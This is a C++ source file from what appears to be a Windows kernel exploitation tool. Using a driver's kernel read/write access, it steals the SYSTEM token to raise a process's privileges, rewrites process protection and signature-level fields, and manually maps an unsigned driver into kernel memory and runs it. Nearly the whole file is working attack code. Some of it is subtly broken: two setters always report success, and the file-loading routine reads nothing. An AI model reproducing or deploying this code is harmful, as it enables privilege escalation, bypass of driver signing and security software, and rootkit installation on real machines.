#include "DriverLoader.h"
#include "DriverWorker.hpp"
#include "Log.hpp"
#include "Utils.hpp"
#include "PEUtils.hpp"
#include "KernelUtils.hpp"
#include <psapi.h>
#include <filesystem>
#include <fstream>

#pragma comment(lib, "Psapi.lib")

typedef USHORT RTL_ATOM, * PRTL_ATOM;

typedef
NTSTATUS
(WINAPI* pFnNtAddAtom)(
	_In_reads_bytes_opt_(Length) PCWSTR AtomName,
	_In_ ULONG Length,
	_Out_opt_ PRTL_ATOM Atom
	);

auto 
DriverLoader::GetKernelBase() -> ULONG64
{
	auto enableDebugPrivilege = []() -> BOOLEAN {
		BOOLEAN bResult{ FALSE };
		NTSTATUS status = Utils::RtlAdjustPrivilege(20/*SeDebugPrivilege*/, TRUE, FALSE, nullptr);
		if (!NT_SUCCESS(status))
		{
			LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
			return FALSE;
		}
		return TRUE;
		};

	if (!enableDebugPrivilege())
	{
		return 0;
	}

	LPVOID	drivers[1024]{};
	DWORD	cbNeeded{};
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		return reinterpret_cast<ULONG64>(drivers[0]);
	}

	return 0;
}


#define TEST 

BOOLEAN
DriverLoader::PrivilegeEscalation(
	ULONG64 SourceProcess,
	ULONG64 TargetProcess,
	ULONG	OffsetOfProcessToken)
{
	// Replace other driver classes.
	//std::unique_ptr<DriverProvider<BiosToolCommonDriver>> driverLoader = std::make_unique<BiosToolCommonDriver>();
	BOOLEAN bReturn{ FALSE };
	do 
	{
		
#ifdef TEST
		system("whoami");
		LOG("----------------------------------Fxxking System---------------------------------");
#endif
		ULONG64 systemToken = 0;
		if (!DriverWorker::Read((PVOID)(SourceProcess + OffsetOfProcessToken), &systemToken, sizeof(systemToken)))
		{
			LOG("[-] KernelRead System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << std::dec);
			break;
		}
		//LOG("[+] System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << " value : " << systemToken << std::dec << std::endl);

		systemToken &= ~0xF; // Clear the low 4 bits, which are used for reference counting in the token structure

		if (!DriverWorker::Write(reinterpret_cast<PVOID>(TargetProcess + OffsetOfProcessToken),
										   &systemToken,
										   sizeof(ULONG64)))
		{
			LOG("[-] KernelWrite Current Process Token address : " << std::hex << (TargetProcess + OffsetOfProcessToken) << std::dec);
			break;
		}

#ifdef TEST
		LOG("---------------------------------------------------------------------------------");
		LOG("[+] Privilege Escalation Successful!");

		system("whoami");
		LOG("-------------------------------------End-----------------------------------------");

		//system("pause");
#endif
		bReturn = TRUE;
	} while (FALSE);
	
	return bReturn;
}

BOOLEAN 
DriverLoader::SetProcessProtection(
	ULONG64			Process, 
	ULONG			OffsetOfProtection,
	PS_PROTECTION*	Protection)
{
	BOOLEAN bReturn{ FALSE };
	do
	{
		// set protection
		if (!DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
										   Protection,
										   sizeof(DriverLoader::PS_PROTECTION)))
		{
			LOG("[-] KernelWrite Current Process Protection address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: "	<< std::hex << static_cast<int>(Protection->Level) << std::dec);
			LOG("    - Protection Type: "	<< std::hex << static_cast<int>(Protection->Type) << std::dec);
			LOG("    - Protection Signer: " << std::hex << static_cast<int>(Protection->Signer) << std::dec);
			break;
		}
		/*else
		{
			LOG("[+] Successfully set process protection at address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: " << std::hex << static_cast<int>(Protection->Level) << std::dec);
			LOG("    - Protection Type: " << std::hex << static_cast<int>(Protection->Type) << std::dec);
			LOG("    - Protection Signer: " << std::hex << static_cast<int>(Protection->Signer) << std::dec);
		}*/
		
		bReturn = TRUE;
	} while (FALSE);

	return TRUE;
}

BOOLEAN 
DriverLoader::SetSignatureLevel(
	ULONG64 Process,
	ULONG	OffsetOfSignatureLevel, 
	PUCHAR	SignatureLevel)
{
	BOOLEAN bReturn{ FALSE };
	do
	{
		//UCHAR signatureLevel = 0xC; // SE_SIGNING_LEVEL_WINDOWS

		if (!DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
										   SignatureLevel,
										   sizeof(UCHAR)))
		{
			LOG("[-] KernelWrite Current Process Signature Level address : " << std::hex << (Process + OffsetOfSignatureLevel) << std::dec);
			break;
		}
		
		bReturn = TRUE;
	} while (FALSE);

	return TRUE;
}

auto DriverLoader::InitMemoryManager() ->BOOLEAN
{
	auto hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
	{
		LOG("[-] Failed to get handle for ntdll.dll. Error code: " << std::hex << GetLastError() << std::dec);
		return FALSE;
	}

	pFnNtAddAtom pNtAddAtom = (pFnNtAddAtom)GetProcAddress(hNtdll, "NtAddAtom");
	if (!pNtAddAtom)
	{
		LOG("[-] Failed to get address for NtAddAtom. Error code: " << std::hex << GetLastError() << std::dec);
		return FALSE;
	}

	// call once
	pNtAddAtom(nullptr, 0, nullptr);

	return TRUE;
}

BOOLEAN 
DriverLoader::MapperDriver(
	const PUCHAR DriverData, 
	AllocationMode Mode /*= AllocationMode::AllocatePool*/)
{
	BOOLEAN bReturn{ FALSE };

	auto originalDriverPE = std::make_unique<PEUtils>(const_cast<PUCHAR>(DriverData));
	auto imageSize = originalDriverPE->GetDriverImageSize();
	if (!imageSize)
	{
		LOG("[-] Failed to get driver image size." << std::endl);
		return FALSE;
	}

	auto imageBase = originalDriverPE->GetDriverImageBase();
	if (!imageBase)
	{
		LOG("[-] Failed to get driver image base." << std::endl);
		return FALSE;
	}


	auto oep = originalDriverPE->GetEntryPoint();
	if (!oep)
	{
		LOG("[-] Failed to get driver entry point." << std::endl);
		return FALSE;
	}
	//else
	//{
	//	LOG("[+] Driver entry point offset: " << std::hex << oep << std::dec << std::endl);
	//}

	PVOID pDriverLocalBase = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, imageSize);
	if (!pDriverLocalBase)
	{
		LOG("[-] Failed to allocate memory for driver in local space." << std::endl);
		return FALSE;
	}
	//else
	//{
	//	LOG("[+] Allocated memory for driver in local space at address: " << std::hex << pDriverLocalBase << std::dec << std::endl);
	//}

	// copy headers and sections to local buffer
	memcpy(pDriverLocalBase, DriverData, originalDriverPE->GetSizeOfHeaders());

	for (const auto& sectionHeader : originalDriverPE->GetSectionHeaders())
	{
		if ((sectionHeader.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
		{
			continue;
		}

		auto dest = reinterpret_cast<PUCHAR>(pDriverLocalBase) + sectionHeader.VirtualAddress;
		memcpy(dest, DriverData + sectionHeader.PointerToRawData, sectionHeader.SizeOfRawData);
	}



	auto selfDriverPE = std::make_unique<PEUtils>(reinterpret_cast<PUCHAR>(pDriverLocalBase));
	// alloc memory for driver in kernel space
	PVOID pDriverKernelBase{ nullptr };
	do
	{
		if (Mode == AllocationMode::AllocatePool)
		{
			pDriverKernelBase = AllocatePool2(imageSize);
			if (!pDriverKernelBase)
			{
				LOG("[-] Failed to allocate memory for driver in kernel space." << std::endl);
				break;
			}
		}

		selfDriverPE->FixedRelocations(reinterpret_cast<ULONG64>(pDriverKernelBase) - imageBase);

		if (!selfDriverPE->FixedSecurityCookie(reinterpret_cast<ULONG64>(pDriverKernelBase)))
		{
			LOG("Failed to fix driver Security cookie.");
			break;
		}

		if (!selfDriverPE->FixedImports())
		{
			LOG("[-] Failed to fix driver imports." << std::endl);
			break;
		}
		/*else
		{
			LOG("[+] Successfully fixed driver imports." << std::endl);
		}*/

		if (!DriverWorker::Write(pDriverKernelBase,
								 pDriverLocalBase,
								 imageSize))
		{
			LOG("[-] Failed to write driver to kernel memory." << std::endl);
			break;
		}
		else
		{
			//dump write driver data for testing
			/*PUCHAR pWriteBuffer = reinterpret_cast<PUCHAR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, imageSize));
			if (pWriteBuffer)
			{
				if (DriverWorker::->Read(pDriverKernelBase,
												 pWriteBuffer,
												 imageSize))
				{
					auto path = std::filesystem::current_path();
					path += "\\DumpedDriver.sys";

					std::ofstream ofs(path.c_str(), std::ios::binary | std::ios::out);
					if (ofs.is_open())
					{
						ofs.write(reinterpret_cast<const char*>(pWriteBuffer), imageSize);
						ofs.close();
						LOG("dump memory address: " << std::hex << pDriverKernelBase << std::dec << " to file: " << path << std::endl);
						LOG("[+] Successfully dumped driver to: " << path << std::endl);
					}
				}
				HeapFree(GetProcessHeap(), 0, pWriteBuffer);
			}*/
		}

		// call OEP run mapping driver code
		const auto oepAddress = reinterpret_cast<ULONG64>(pDriverKernelBase) + oep;
		NTSTATUS status{ STATUS_SUCCESS };
		if (!CallKernelFunction(&status,
			oepAddress,
			0,
			0))
		{
			LOG("[-] Failed to call driver entry point." << std::endl);
			break;
		}

		bReturn = TRUE;
	} while (FALSE);

	if (pDriverLocalBase)
	{
		HeapFree(GetProcessHeap(), 0, pDriverLocalBase);
	}

	return bReturn;
}

BOOLEAN 
DriverLoader::MapperDriver(
	const std::string_view DriverPath, 
	AllocationMode Mode /*= AllocationMode::AllocatePool*/)
{
	std::ifstream readFile(DriverPath, std::ios::binary | std::ios::in);
	if (!readFile.is_open())
	{
		LOG("Read mapping driver file failed!!!");
		return FALSE;
	}

	std::stringstream readBuffer{};
	readBuffer << readBuffer.rdbuf();

	auto buffer = readBuffer.str();

	return MapperDriver(reinterpret_cast<PUCHAR>(buffer.data()), Mode);
}
